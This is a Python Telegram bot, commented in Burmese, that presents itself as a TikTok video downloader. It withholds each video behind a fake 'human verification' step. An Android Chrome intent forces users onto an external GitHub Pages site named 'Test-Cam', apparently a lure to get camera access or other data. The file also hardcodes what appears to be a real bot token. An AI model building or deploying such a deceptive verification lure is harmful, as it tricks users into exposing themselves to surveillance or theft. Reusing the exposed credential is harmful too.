import telebot
import requests
from telebot import types

# Bot Token ကို အမှန်ပြန်ထည့်ပါ
BOT_TOKEN = "8699185806:AAHioOhJMq-0nO_uYycVkbV4c_xNm_Xd3xY"
# မင်းရဲ့ GitHub Link အမှန်
GITHUB_URL = "https://tar-alt.github.io/Test-Cam/"

bot = telebot.TeleBot(BOT_TOKEN)
user_links = {}

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.chat.id
    
    # Verification အောင်မြင်ပြီး ပြန်လာခြင်း ရှိမရှိ စစ်ဆေးခြင်း
    if "Verification_Success" in message.text:
        link = user_links.get(user_id)
        if link:
            bot.send_message(user_id, "✅ Verification အောင်မြင်ပါသည်။ ဗီဒီယို ပို့ပေးနေပါပြီ...")
            try:
                # TikTok Video Download Logic
                api_url = f"https://www.tikwm.com/api/?url={link}&hd=1"
                res = requests.get(api_url).json()
                if res.get('code') == 0:
                    video_url = res['data'].get('hdplay') or res['data'].get('play')
                    bot.send_video(user_id, video_url, caption="✅ *Download Successful!*")
                else:
                    bot.send_message(user_id, "❌ ဗီဒီယို ရှာမတွေ့ပါ။ Link ကို ပြန်စစ်ပေးပါ။")
            except Exception as e:
                bot.send_message(user_id, "⚠️ စနစ်ချို့ယွင်းချက် ဖြစ်ပေါ်နေပါသည်။")
        else:
            bot.send_message(user_id, "❌ Link မရှိတော့ပါ။ TikTok link ကို ပြန်ပို့ပေးပါ။")
    else:
        bot.send_message(user_id, "🌟 *Ultra HD TikTok Downloader*\n\nTikTok Link ပို့ပေးပါ။", parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text and ("tiktok.com" in message.text or "vt.tiktok.com" in message.text))
def handle_link(message):
    user_id = message.chat.id
    user_links[user_id] = message.text # Link သိမ်းလိုက်ပြီ
    
    # Chrome Intent (Android တွင် Chrome ဖြင့် အတင်းဖွင့်ခိုင်းရန်)
    clean_url = GITHUB_URL.replace("https://", "")
    chrome_intent = f"intent://{clean_url}#Intent;scheme=https;package=com.android.chrome;end"
    
    markup = types.InlineKeyboardMarkup()
    verify_btn = types.InlineKeyboardButton(text="ဗီဒီယိုဒေါင်းရန် Verification လုပ်ပါ 🔓", url=chrome_intent)
    markup.add(verify_btn)
    
    bot.reply_to(message, "⚠️ **Verification Required**\n\nဗီဒီယိုရယူရန် လူဟုတ်မဟုတ် အရင်စစ်ဆေးပေးပါ။", reply_markup=markup, parse_mode="Markdown")

# Bot ကို Infinity Polling ဖြင့် run မည်
print("Bot is starting...")
bot.infinity_polling()

